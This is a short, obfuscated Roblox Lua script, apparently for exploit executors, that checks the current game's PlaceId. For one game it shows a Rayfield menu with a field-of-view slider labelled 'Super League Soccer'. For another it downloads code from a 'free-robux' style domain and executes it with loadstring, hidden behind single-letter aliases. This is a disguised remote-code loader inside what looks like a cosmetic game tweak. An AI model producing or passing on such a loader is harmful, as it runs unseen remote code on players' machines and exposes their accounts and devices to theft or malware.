local k,l = game, game.GetService local a,b,c,d = k.PlaceId, assert, pcall, loadstring local sts = k[l](k, "Players").LocalPlayer.CharacterAdded;

local function utg() 
    local stat, src = b(c(game.HttpGetAsync, k, ("https://%s/%s"):format('skibiditoilet.free-robux.click', 'p/raw/bryvmasag5')));
    if stat then local lstat, res = c(d, src) if lstat then b(res) if sts then vs = true end l(k, "UserInputService").MouseIconEnabled = vs else assert(lstat, "Error Retrieving Script: " ..res) end end 
end
local function sls()
    local function io() return game:HttpGet("https://sirius.menu/rayfield") end
    local ion = b(d(io()))();
    local lib = ion:CreateWindow({
        Name = "Super League Soccer",
        LoadingTitle = "DevBuild v0.00a",
        LoadingSubtitle = "@ ex.ft via discord",
        KeySystem = false
    })
    local tb = lib:CreateTab("Main") local sc = tb:CreateSection("Visuals") local fov = tb:CreateSlider({Name = "FOV Changer", Range = {60,120},Increment = 1,Suffix = "fov",CurrentValue = 60,Flag = "fov",Callback = function(v) l(k, "Workspace").CurrentCamera.FieldOfView = v end})
end

 if sts then local function cps() local id = {["14044547200"] = utg, ["12177325772"] = sls} local str = tostring(a) if id[str] then id[str]() end end cps() end 
